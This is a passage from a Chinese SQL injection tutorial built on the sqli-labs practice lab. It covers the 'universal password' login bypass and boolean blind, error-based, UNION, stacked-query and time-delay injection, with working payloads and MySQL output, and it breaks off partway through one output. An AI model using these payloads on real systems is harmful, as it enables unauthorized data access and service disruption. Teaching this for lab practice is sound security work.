+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
+		}
+	}
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p data-nodeid="1847">可以看到，用户在登录框输入的用户名及密码未经过滤就直接传入以下 SQL 语句：</p>
+<pre class="lang-sql hljs" data-nodeid="1848"><code data-language="sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">'$uname'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">'$passwd'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>
+</code></pre>
+<p data-nodeid="1849">如果此时我在 Username 中输入英文单引号，那么 SQL 语句就变成：</p>
+<pre class="lang-sql hljs" data-nodeid="1850"><code data-language="sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">''' and password='' LIMIT 0,1
+</span></code></pre>
+<p data-nodeid="1851">这里 username 没有闭合，会导致语法错误：</p>
+<blockquote data-nodeid="1852">
+<p data-nodeid="1853">You have an error in your SQL syntax；check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password='' LIMIT 0,1' at line 1。</p>
+</blockquote>
+<p data-nodeid="1854"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPPmAe_Z_AALZLcXi9OA547.png" alt="Drawing 1.png" data-nodeid="2066"></p>
+<div data-nodeid="1855"><p style="text-align:center">图 2：username 没有闭合导致的语法错误</p></div>
+<p data-nodeid="1856">还记得开头提到的万能密码吗？我们输入试试：</p>
+<p data-nodeid="1857"><img src="https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPP6AYussAALaISw7_cc369.png" alt="Drawing 2.png" data-nodeid="2070"></p>
+<div data-nodeid="1858"><p style="text-align:center">图 3：输入万能钥匙</p></div>
+<p data-nodeid="1859">成功登录了！那为什么会这样呢？</p>
+<p data-nodeid="1860">我们先来看下输入万能密码后，SQL 语句的构成：</p>
+<pre class="lang-sql hljs" data-nodeid="1861"><code data-language="sql"><span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">''</span><span class="hljs-keyword">or</span><span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">''</span><span class="hljs-keyword">or</span><span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>
+</code></pre>
+<p data-nodeid="1862">可以发现 username 和 password 为空或者 '1'='1'，而'1'='\`'永远为真，SQL 语句必然成立。只要能查询到有效数据就可以登录，或者后面随便回句永远为真的语句就能够绕过验证登录，这就是万能密码存在的原因。</p>
+<p data-nodeid="1863">相信看到这里，你对 SQL 注入产生的原因应该有所理解了。简单来讲，就是开发时未对用户的输入数据（可能是 GET 或 POST 参数，也可能是 Cookie、HTTP 头等）进行有效过滤，直接带入 SQL 语句解析，使得原本应为参数数据的内容，却被用来拼接 SQL 语句做解析，也就是说，<strong data-nodeid="2095">将数据当代码解析，最终导致 SQL 注入漏洞的产生</strong>。</p>
+<p data-nodeid="1864">关于此类漏洞的防御我会在《09 | CSRF 漏洞：谁改了我的密码？》中介绍。</p>
+<h3 data-nodeid="1865">SQL 注入的分类</h3>
+<p data-nodeid="1866">我们接着来了解 SQL 注入的分类。根据注入点（比如漏洞参数）的数据类型不同，SQL 注入可以分为两类：数字/整数型注入和字符型注入。</p>
+<h4 data-nodeid="1867">数字/整数型注入</h4>
+<p data-nodeid="1868">注入的参数为整数时就是数字型注入，或者叫整数型注入。其 SQL 语句原型类似：</p>
+<pre class="lang-sql hljs" data-nodeid="1869"><code data-language="sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>
+</code></pre>
+<p data-nodeid="1870">此处 id 参数为整数，两边无引号。测试时可以使用 1+1 和 3-1 这种计算结果相同的参数值去构造请示，对比响应结果是否一致，如果相同就可能在数字型注入。</p>
+<h4 data-nodeid="1871">字符型注入</h4>
+<p data-nodeid="1872">注入参数为字符串时就是字符型注入，其 SQL 语句原型类似：</p>
+<pre class="lang-sql hljs" data-nodeid="1873"><code data-language="sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span>=<span class="hljs-string">'test'</span>
+</code></pre>
+<p data-nodeid="1874">此处的 name 为字符串参数，两边包含引号。</p>
+<p data-nodeid="1875">其他资料也有给出第 3 种分类：<strong data-nodeid="2112">搜索型注入</strong>，但我认为它本质上属于字符型注入，只是相对特殊一点，存在于搜索语句中。此类注入常常以 % 为关键字来闭合 SQL 语句。</p>
+<p data-nodeid="1876">区分数字型与字符型注入的最简单办法就是看<strong data-nodeid="2118">是否存在引号</strong>。在有源码的情况下很好判断，若无源码，可以尝试输入单引号看是否报错，同时也可以直接根据输入参数的类型做初步判断。</p>
+<p data-nodeid="1877">了解了 SQL 注入的分类后，就可以针对不同的注入类型采取不同的注入测试技术。</p>
+<h3 data-nodeid="1878">SQL 注入测试技术</h3>
+<p data-nodeid="1879">我认为当前 SQL 注入利用工具中，sqlmap 无疑是王者。它涵盖了 SQL 注入检测、利用、防御绕过、扩展、getshell 等多种功能，功能全面且工程化，是学习研究 SQL 注入绕不开的工具。</p>
+<p data-nodeid="1880">如果你查看 sqlmap 的命令帮助信息，可以发现它使用的 SQL 注入技术共有以下 6 种，默认全开，对应的参数值为“BEUSTQ”，如下所示：</p>
+<pre class="lang-java hljs" data-nodeid="1881"><code data-language="java">&nbsp; Techniques:
+&nbsp; &nbsp; These options can be used to tweak testing of specific SQL injection
+&nbsp; &nbsp; techniques
+&nbsp; &nbsp; --technique=TECH..&nbsp; <span class="hljs-function">SQL injection techniques to <span class="hljs-title">use</span> <span class="hljs-params">(<span class="hljs-keyword">default</span> <span class="hljs-string">"BEUSTQ"</span>)</span>
+</span></code></pre>
+<p data-nodeid="1882">BEUSTQ 的参数含义如下：</p>
+<ul data-nodeid="1883">
+<li data-nodeid="1884">
+<p data-nodeid="1885">B，Boolean-based blind（布尔型盲注）；</p>
+</li>
+<li data-nodeid="1886">
+<p data-nodeid="1887">E，Error-based（报错型注入）；</p>
+</li>
+<li data-nodeid="1888">
+<p data-nodeid="1889">U，Union query-based（联合查询注入）；</p>
+</li>
+<li data-nodeid="1890">
+<p data-nodeid="1891">S，Stacked queries（多语句堆叠注入）；</p>
+</li>
+<li data-nodeid="1892">
+<p data-nodeid="1893">T，Time-based blind（基于时间延迟盲注）；</p>
+</li>
+<li data-nodeid="1894">
+<p data-nodeid="1895">Q，Inline queries（内联/嵌套查询注入）。</p>
+</li>
+</ul>
+<p data-nodeid="1896">下面我就重点来讲解这 6 大 SQL 注入技术。</p>
+<h4 data-nodeid="1897">布尔型盲注</h4>
+<p data-nodeid="1898">布尔（Boolean）就是真假两种结果，比如“1=1”为真，“1=2”为假。</p>
+<p data-nodeid="1899">前面列举的 SQL 注入是存在错误显示的，很容易判断 SQL 语句被注入后出错。但是，很多时间并没有错误回显，这时就只能“盲注”。我们可以通过对比真假请求的响应内容来判断是否存在 SQL 注入，这就是布尔型盲注。比如，对比注入参数与“and 1=2”的返回结果，如果两者不同则代表可能存在 SQL 注入。</p>
+<p data-nodeid="1900">除了布尔型盲注外，我们还可以采用时间延迟的方式来盲注，我在后面会讲到。</p>
+<p data-nodeid="1901"><img src="https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPQ2AHPOrAAMq22_Vn7A821.png" alt="Drawing 3.png" data-nodeid="2137"></p>
+<div data-nodeid="1902"><p style="text-align:center">图 4：正常访问的页面</p></div>
+<p data-nodeid="1903">以 sqli-labs 第 8 题为例，上图是正常访问后的网页内容。通过 Get 参数 id 实现 SQL 注入，我们直接用前面讲的单引号注入试试，请求地址为 http://localhost/Less-8/?id=1'，返回结果如下：</p>
+<p data-nodeid="1904"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPRWATvHkAAMWNlgn8Q0897.png" alt="Drawing 4.png" data-nodeid="2143"></p>
+<div data-nodeid="1905"><p style="text-align:center">图 5：单引号注入的返回结果</p></div>
+<p data-nodeid="1906">没有任何错误提示，显示此方法行不通。</p>
+<p data-nodeid="1907">下面我们试试布尔型盲注的方法，分别构造以下两个请示，然后对比二者的差异：</p>
+<ul data-nodeid="1908">
+<li data-nodeid="1909">
+<p data-nodeid="1910">http://localhost/Less-8/?id=1'and+1=1</p>
+</li>
+<li data-nodeid="1911">
+<p data-nodeid="1912">http://localhost/Less-8/?id=1'and+1=2</p>
+</li>
+</ul>
+<p data-nodeid="1913">其中的 + 号代表空格，执行上述请求后，你会发现返回的页面没有任何变化。难道真没有 SQL 注入吗？</p>
+<p data-nodeid="1914">我们来看一下源码：</p>
+<pre class="lang-php hljs" data-nodeid="1915"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-comment">//including the Mysql connect parameters.</span>
+	<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
+	error_reporting(<span class="hljs-number">0</span>);
+	<span class="hljs-comment">// take the variables</span>
+	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>]))
+	{
+	  $id=$_GET[<span class="hljs-string">'id'</span>];
+	  <span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
+	  $fp=fopen(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
+	  fwrite($fp,<span class="hljs-string">'ID:'</span>.$id.<span class="hljs-string">"\n"</span>);
+	  fclose($fp);
+	
+	  <span class="hljs-comment">// connectivity </span>
+	  $sql=<span class="hljs-string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;
+	  $result=mysql_query($sql);
+	   $row = mysql_fetch_array($result);
+	
+	  <span class="hljs-keyword">if</span>($row)
+	   {
+          <span class="hljs-comment">// 成功</span>
+	  	  <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	
+	  	  <span class="hljs-keyword">echo</span> <span class="hljs-string">'You are in...........'</span>;
+	  	  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;
+
+"</span>;
+	      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
+	    }
+		<span class="hljs-keyword">else</span> 
+		{
+          <span class="hljs-comment">// 失败，关闭错误回显</span>
+  		  <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;
+  		  <span class="hljs-comment">//echo 'You are in...........';</span>
+  		  <span class="hljs-comment">//print_r(mysql_error());</span>
+  		  <span class="hljs-comment">//echo "You have an error in your SQL syntax";</span>
+  		  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;&lt;/font&gt;"</span>;	
+  		  <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	
+		
+		}
+	}
+		<span class="hljs-keyword">else</span> { <span class="hljs-keyword">echo</span> <span class="hljs-string">"Please input the ID as parameter with numeric value"</span>;}
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p data-nodeid="1916">重点就在这句 SQL 语句上：</p>
+<pre class="lang-sql hljs" data-nodeid="1917"><code data-language="sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'$id'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>
+</code></pre>
+<p data-nodeid="1918">注意这里有单引号，所以是字符型注入，我们将前面的测试语句代入：</p>
+<pre class="lang-sql hljs" data-nodeid="1919"><code data-language="sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-string">' LIMIT 0,1
+</span></code></pre>
+<p data-nodeid="1920">此处单引号未得到闭合，导致了语法错误，这正是前面测试方法失败的原因。我们可以考虑用--注释掉。<strong data-nodeid="2161">在 URL 请求里要注意在后面加 +，+ 在 URL 中相当于空格，加了 + 才能有效注释</strong>。最后我们得到构造语句：</p>
+<pre class="lang-sql hljs" data-nodeid="1921"><code data-language="sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1'</span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-comment">-- ' LIMIT 0,1</span>
+</code></pre>
+<p data-nodeid="1922">为了方便验证 SQL 语句，推荐你直接进入 Docker 容器的 MySQL 进行测试：</p>
+<pre class="lang-shell hljs" data-nodeid="1923"><code data-language="shell"><span class="hljs-meta">$</span><span class="bash"> sudo docker ps</span>
+CONTAINER ID&nbsp; &nbsp; &nbsp; &nbsp; IMAGE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; COMMAND&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;CREATED&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;STATUS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PORTS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NAMES
+ea6ec615a39e&nbsp; &nbsp; &nbsp; &nbsp; acgpiano/sqli-labs&nbsp; &nbsp;"/run.sh"&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;29 hours ago&nbsp; &nbsp; &nbsp; &nbsp; Up 29 hours&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0.0.0.0:80-&gt;80/tcp, 3306/tcp&nbsp; &nbsp;sqli-labs
+<span class="hljs-meta">$</span><span class="bash"> sudo docker <span class="hljs-built_in">exec</span> -it ea6ec615a39e /bin/bash</span>
+<span class="hljs-meta">$</span><span class="bash"> root@ea6ec615a39e:/<span class="hljs-comment"># mysql -u root</span></span>
+<span class="hljs-meta">mysql&gt;</span><span class="bash"> use security;</span>
+<span class="hljs-meta">mysql&gt;</span><span class="bash"> SELECT * FROM users WHERE id=<span class="hljs-string">'1'</span> LIMIT 0,1;</span>
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|&nbsp; 1 | Dumb&nbsp; &nbsp; &nbsp;| Dumb&nbsp; &nbsp; &nbsp;|
++----+----------+----------+
+1 row in set (0.00 sec)
+<span class="hljs-meta">
+mysql&gt;</span><span class="bash"> SELECT * FROM users WHERE id=<span class="hljs-string">'1 and 1=1'</span> LIMIT 0,1;</span>
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|&nbsp; 1 | Dumb&nbsp; &nbsp; &nbsp;| Dumb&nbsp; &nbsp; &nbsp;|
++----+----------+----------+
+1 row in set, 1 warning (0.00 sec)
+<span class="hljs-meta">
+mysql&gt;</span><span class="bash"> SELECT * FROM users WHERE id=<span class="hljs-string">'1 and 1=2'</span> LIMIT 0,1;</span>
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|&nbsp; 1 | Dumb&nbsp; &nbsp; &nbsp;| Dumb&nbsp; &nbsp; &nbsp;|
++----+----------+----------+
+1 row in set, 1 warning (0.00 sec)
+<span class="hljs-meta">
+mysql&gt;</span><span class="bash"> SELECT * FROM users WHERE id=<span class="hljs-string">'1'</span> and 1=2<span class="hljs-string">''</span> LIMIT 0,1;</span>
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' LIMIT 0,1' at line 1
+<span class="hljs-meta">mysql&gt;</span><span class="bash"> SELECT * FROM users WHERE id=<span class="hljs-string">'1'</span> and 1=2-- <span class="hljs-string">' LIMIT 0,1;</span></span>
+Empty set (0.00 sec)
+<span class="hljs-meta">
+mysql&gt;</span><span class="bash"><span class="hljs-string"> SELECT * FROM users WHERE id='</span>1<span class="hljs-string">' and 1=1-- '</span> LIMIT 0,1;</span>
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|&nbsp; 1 | Dumb&nbsp; &nbsp; &nbsp;| Dumb&nbsp; &nbsp; &nbsp;|
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre>
+<p data-nodeid="1924">现在我们按此思路重新构造两个请求。</p>
+<ul data-nodeid="1925">
+<li data-nodeid="1926">
+<p data-nodeid="1927">请求 1：http://localhost/Less-8/?id=1'and+1=1--+</p>
+</li>
+<li data-nodeid="1928">
+<p data-nodeid="1929">请求 2：http://localhost/Less-8/?id=1'and+1=2--+</p>
+</li>
+</ul>
+<p data-nodeid="1930"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPSSAcUf3AAOSbJ2meEM358.png" alt="Drawing 5.png" data-nodeid="2172"></p>
+<div data-nodeid="1931"><p style="text-align:center">图 6：请求 1 展示图</p></div>
+<p data-nodeid="1932"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPSqACFm1AAOOcCQ2IIE741.png" alt="Drawing 6.png" data-nodeid="2175"></p>
+<div data-nodeid="1933"><p style="text-align:center">图 7：请求 2 展示图</p></div>
+<p data-nodeid="1934">我们可以看到，两次结果是不一样的，主要体现在有无“You are in...........”字符串，此时我们就可以确认 SQL 注入是存在的。</p>
+<h4 data-nodeid="1935">报错型注入</h4>
+<p data-nodeid="1936">有错误回显的都可以尝试使用报错型注入方法，在 sqli-labs 第 11 题中介绍的单引号注入方式就是最简单有效的检测方法，它的本质是设法构造出错误的 SQL 语法使其执行错误。</p>
+<p data-nodeid="1937">前面列举的都是字符型注入，这次我们聊下整数型的。以 sqli-labs 第 2 题为例，我们重点看下导致注入的语句：</p>
+<pre class="lang-sql hljs" data-nodeid="1938"><code data-language="sql">$sql="<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">";
+</span></code></pre>
+<p data-nodeid="1939">$id 参数两边无引号，这是典型的整数型注入。虽然是整数型的，但你使用单引号注入依然会报错，因为语句未得到有效闭合。</p>
+<p data-nodeid="1940">既然我们的目标是让 SQL 语法错误，那方法就多了，各种造成语句无法闭合的字符：单引号、双引号、大中小括号等标点符号、特殊符号、宽字符等，还有 SQL 语句中的关键词，比如 IF、SELECT 都可以。</p>
+<p data-nodeid="1941">下图是注入中文句号（宽字符）导致的错误：</p>
+<p data-nodeid="1942"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPTmAH1smAAOLYXHDOxU134.png" alt="Drawing 7.png" data-nodeid="2185"></p>
+<div data-nodeid="1943"><p style="text-align:center">图 8：宽字符导致的错误</p></div>
+<p data-nodeid="1944">注入关键词 IF 导致的错误：</p>
+<p data-nodeid="1945"><img src="https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPT-AD3rcAAOEXKoNpik989.png" alt="Drawing 8.png" data-nodeid="2189"></p>
+<div data-nodeid="1946"><p style="text-align:center">图 9：注入关键词 IF 导致的错误</p></div>
+<p data-nodeid="1947">拥有错误回显的 SQL 注入应该是最容易发现的，但很多时候并不会有错误回显，这时就需要使用其他盲注方式来验证。</p>
+<h4 data-nodeid="1948">联合查询注入</h4>
+<p data-nodeid="1949">联合查询是指使用 union 语句来查询，比如：</p>
+<pre class="lang-sql hljs" data-nodeid="1950"><code data-language="sql">id =-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>
+</code></pre>
+<p data-nodeid="1951"><strong data-nodeid="2197">注意这里 id 的值不存在，目前是为了在页面上显示 union 查询结果</strong>。</p>
+<p data-nodeid="1952">这样的好处就相当于另起一句 SQL 语句，非常适用于获取数据库中一些敏感信息，而不必过多考虑原有 SQL 语句的情况。因此，它在实际的漏洞利用中也经常被使用。联合查询注入也是验证漏洞可利用性的最佳方法之一，但经常需要结合错误回显。</p>
+<p data-nodeid="1953">我们仍以 sqli-labs 第 2 题为例，先构造以下请求：</p>
+<pre class="lang-sql hljs" data-nodeid="1954"><code data-language="sql">http://localhost/Less-2/?id=0 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>
+</code></pre>
+<p data-nodeid="1955">得到错误提示“The used SELECT statements have a different number of columns”，也就是字段数有误，如下图所示：</p>
+<p data-nodeid="1956"><img src="https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPUqADu50AANtXLBwuf0866.png" alt="Drawing 9.png" data-nodeid="2203"></p>
+<div data-nodeid="1957"><p style="text-align:center">图 10：字段数有误</p></div>
+<p data-nodeid="1958">此时我们可以逐渐增加字段数来找到合适字段数：</p>
+<pre class="lang-sql hljs" data-nodeid="1959"><code data-language="sql">回显错误：http://localhost/Less-2/?id=0 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>
+正确：<span class="hljs-keyword">http</span>://localhost/<span class="hljs-keyword">Less</span><span class="hljs-number">-2</span>/?<span class="hljs-keyword">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>
+回显错误：<span class="hljs-keyword">http</span>://localhost/<span class="hljs-keyword">Less</span><span class="hljs-number">-2</span>/?<span class="hljs-keyword">id</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>
+</code></pre>
+<p data-nodeid="1960">最后发现它共有 3 个字段，我们看看哪些字段显示出来了：<br>
+<img src="https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPVGAYoxhAANs6mFjRDI693.png" alt="Drawing 10.png" data-nodeid="2209"></p>
+<div data-nodeid="1961"><p style="text-align:center">图 11：字段展示</p></div>
+<p data-nodeid="1962">可以发现 2 和 3 字段显示在页面中，这里我们就可以进一步构造利用以获取数据库名和版本信息：</p>
+<pre class="lang-sql hljs" data-nodeid="1963"><code data-language="sql">http://localhost/Less-2/?id=0 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">version</span>()
+</code></pre>
+<p data-nodeid="1964">最终，我们成功爆出数据库名为 security，版本为 5.5.44-0ubuntu0.14.04.1，如下图所示：</p>
+<p data-nodeid="1965"><img src="https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPVmAaBouAAN-25Njwzw855.png" alt="Drawing 11.png" data-nodeid="2214"></p>
+<div data-nodeid="1966"><p style="text-align:center">图 12：成功爆出数据库名</p></div>
+<h4 data-nodeid="1967">多语句堆叠注入</h4>
+<p data-nodeid="1968">在 SQL 语句中，允许使用分号间隔多个查询语句来执行。mysqli_multi_query() 函数可以通过分号间隔插入多个查询语句实现堆叠注入。以 sqli-labs 第 38 题为例：</p>
+<pre class="lang-php hljs" data-nodeid="1969"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
+    $id=$_GET[<span class="hljs-string">'id'</span>];
+	......
+	$sql=<span class="hljs-string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;
+	<span class="hljs-comment">/* execute multi query */</span>
+	<span class="hljs-keyword">if</span> (mysqli_multi_query($con1, $sql))
+	{
+       ......
+    }
+    ......
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p data-nodeid="1970">此处正是使用 mysqli_multi_query 函数实现的多语句查询。我们可以尝试插入另一条语句来创建表：</p>
+<pre class="lang-sql hljs" data-nodeid="1971"><code data-language="sql">http://localhost/Less-38?id=1';<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sqli <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;
+</code></pre>
+<p data-nodeid="1972">执行前的表：</p>
+<pre class="lang-java hljs" data-nodeid="1973"><code data-language="java">mysql&gt; show tables;
++--------------------+
+| Tables_in_security |
++--------------------+
+| emails&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|
+| referers&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|
+| uagents&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |
+| users&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |
++--------------------+
+<span class="hljs-number">4</span> <span class="hljs-function">rows in <span class="hljs-title">set</span> <span class="hljs-params">(<span class="hljs-number">0.00</span> sec)</span>
+</span></code></pre>
+<p data-nodeid="1974">执行后，成功创建 sqli 表，说明第二条语句执行成功：</p>
+<pre class="lang-java hljs" data-nodeid="1975"><code data-language="java">mysql&gt; show tables;
++--------------------+
+| Tables_in_security |
++--------------------+
+| emails&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|
+| referers&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|
+| sqli&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|
+| uagents&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |
+| users&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |
++--------------------+
+<span class="hljs-number">5</span> <span class="hljs-function">rows in <span class="hljs-title">set</span> <span class="hljs-params">(<span class="hljs-number">0.00</span> sec)</span>
+</span></code></pre>
+<h4 data-nodeid="1976">基于时间延迟盲注</h4>
+<p data-nodeid="1977">基于时间延迟盲注是通过时间延迟来判断是否存在 SQL 注入的常用方法，是用于无任何错误回显情况下的盲注。对于正确语句和错误语句都返回相同内容时也可以使用，所以它的适用范围相对广一些。</p>
+<blockquote data-nodeid="1978">
+<p data-nodeid="1979">注意：在实际测试过程中，特别是线上业务测试，要避免使用过长时间的延时，否则会影响业务的正常运行。换句话说，能够延时注入就基本代表可以去网站进行拒绝服务攻击。</p>
+</blockquote>
+<p data-nodeid="1980">在 MySQL 常用的延时注入方法中，比较实用的有以下 3 种。</p>
+<p data-nodeid="1981">（1）<strong data-nodeid="2237">SLEEP(duration)</strong>：该函数用于休眠，起到延时操作的作用，其参数以秒为单位。</p>
+<pre class="lang-java hljs" data-nodeid="1982"><code data-language="java">mysql&gt; <span class="hljs-function">select <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span>;
++----------+
+| sleep(<span class="hljs-number">5</span>) |
++----------+
+|&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">0</span> |
++----------+
+<span class="hljs-number">1</span> <span class="hljs-function">row in <span class="hljs-title">set</span> <span class="hljs-params">(<span class="hljs-number">5.00</span> sec)</span>
+</span></code></pre>
+<p data-nodeid="1983">（2）<strong data-nodeid="2243">BENCHMARK(count,expr)</strong>：重复计算 expr 表达式 count 次。</p>
+<pre class="lang-java hljs" data-nodeid="1984"><code data-language="java">mysql&gt; <span class="hljs-function">select <span class="hljs-title">benchmark</span><span class="hljs-params">(<span class="hljs-number">10000000</span>,sha(<span class="hljs-number">1</span>)</span>)</span>;
++----------------------------+
+| benchmark(<span class="hljs-number">10000000</span>,sha(<span class="hljs-number">1</span>)) |
++----------------------------+
+|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-number">0</span> |
++----------------------------+
+<span class="hljs-number">1</span> <span class="hljs-function">row in <span class="hljs-title">set</span> <span class="hljs-params">(<span class="hljs-number">2.72</span> sec)</span>
+</span></code></pre>
+<p data-nodeid="1985">（3）<strong data-nodeid="2249">REPEAT(str,count)</strong>：返回字符串 str 重复 count 次后的字符串。</p>
+<pre class="lang-java hljs" data-nodeid="1986"><code data-language="java">mysql&gt; <span class="hljs-function">select <span class="hljs-title">rpad</span><span class="hljs-params">(<span class="hljs-string">'a'</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">'a'</span>)</span> RLIKE <span class="hljs-title">concat</span><span class="hljs-params">(repeat(<span class="hljs-string">'(a.*)+'</span>,<span class="hljs-number">50</span>)</span>,'b')</span>;
++-------------------------------------------------------------+
+| rpad(<span class="hljs-string">'a'</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">'a'</span>) <span class="hljs-function">RLIKE <span class="hljs-title">concat</span><span class="hljs-params">(repeat(<span class="hljs-string">'(a.*)+'</span>,<span class="hljs-number">50</span>)</span>,'b') |
